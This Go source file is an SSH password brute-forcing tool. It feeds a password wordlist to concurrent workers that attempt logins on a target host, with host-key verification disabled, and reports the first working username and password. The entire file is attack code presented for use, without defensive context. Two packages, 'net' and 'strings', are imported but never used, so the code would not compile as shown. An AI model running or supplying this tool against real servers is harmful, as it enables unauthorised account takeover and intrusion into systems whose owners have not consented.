package main

import (
    "bufio"
    "flag"
    "fmt"
    "log"
    "net"
    "os"
    "strings"
    "sync"
    "time"

    "golang.org/x/crypto/ssh"
)

type Config struct {
    Host     string
    Port     int
    User     string
    Wordlist string
    Threads  int
    Timeout  int
}

func trySSH(host string, port int, user string, password string, timeout int) bool {
    config := &ssh.ClientConfig{
        User: user,
        Auth: []ssh.AuthMethod{
            ssh.Password(password),
        },
        HostKeyCallback: ssh.InsecureIgnoreHostKey(),
        Timeout: time.Duration(timeout) * time.Second,
    }

    conn, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", host, port), config)
    if err != nil {
        return false
    }
    defer conn.Close()
    return true
}

func worker(config Config, passwords <-chan string, results chan<- string, wg *sync.WaitGroup) {
    defer wg.Done()
    for password := range passwords {
        if trySSH(config.Host, config.Port, config.User, password, config.Timeout) {
            results <- fmt.Sprintf("[SUCCESS] %s:%s", config.User, password)
            return
        }
    }
}

func main() {
    host := flag.String("host", "", "Target host")
    port := flag.Int("port", 22, "SSH port")
    user := flag.String("user", "", "Username")
    wordlist := flag.String("wordlist", "", "Password wordlist")
    threads := flag.Int("threads", 4, "Number of threads")
    timeout := flag.Int("timeout", 10, "Connection timeout")
    flag.Parse()

    if *host == "" || *user == "" || *wordlist == "" {
        log.Fatal("Missing required arguments")
    }

    file, err := os.Open(*wordlist)
    if err != nil {
        log.Fatal(err)
    }
    defer file.Close()

    passwords := make(chan string, 100)
    results := make(chan string, 100)
    var wg sync.WaitGroup

    // Start workers
    for i := 0; i < *threads; i++ {
        wg.Add(1)
        go worker(Config{*host, *port, *user, *wordlist, *threads, *timeout}, passwords, results, &wg)
    }

    // Feed passwords
    go func() {
        scanner := bufio.NewScanner(file)
        for scanner.Scan() {
            passwords <- scanner.Text()
        }
        close(passwords)
    }()

    // Wait for results
    go func() {
        wg.Wait()
        close(results)
    }()

    // Print results
    for result := range results {
        fmt.Println(result)
        os.Exit(0)
    }

    fmt.Println("No valid credentials found")
}
